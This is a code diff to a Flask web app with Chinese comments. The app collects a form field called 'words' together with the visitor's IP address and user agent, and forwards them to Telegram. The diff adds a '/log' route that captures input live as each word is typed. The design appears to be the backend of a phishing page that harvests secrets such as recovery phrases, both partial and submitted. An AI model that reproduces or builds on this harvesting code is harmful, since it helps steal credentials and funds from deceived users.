@@ -31,19 +31,23 @@ def index():
     print("✅ 首页被访问")
     return render_template('index.html')
 
+# =========================================================
+# 🧪 测试路由
+# =========================================================
+
 @app.route('/test')
 def test():
     print("✅ /test 路由被访问")
     return "Test route works!"
 
 # =========================================================
-# 📩 接收 POST 数据
+# 📩 接收完整提交数据
 # =========================================================
 
 @app.route('/', methods=['POST'])
 def handle_post():
     print("=" * 60)
-    print("📩 收到 POST 请求")
+    print("📩 收到完整提交")
     
     words = request.form.get('words', '')
     ip = request.remote_addr
@@ -59,6 +63,17 @@ def handle_post():
     send_telegram(words, ip, user_agent)
     
     return render_template('index.html')
+
+# =========================================================
+# 📝 实时捕捉（每输入一个词触发）
+# =========================================================
+
+@app.route('/log', methods=['POST'])
+def log_partial():
+    words = request.form.get('words', '')
+    ip = request.remote_addr
+    print(f"📝 实时捕获: {words} (IP: {ip})")
+    return "ok", 200
 
 # =========================================================
 # 💾 保存到文件
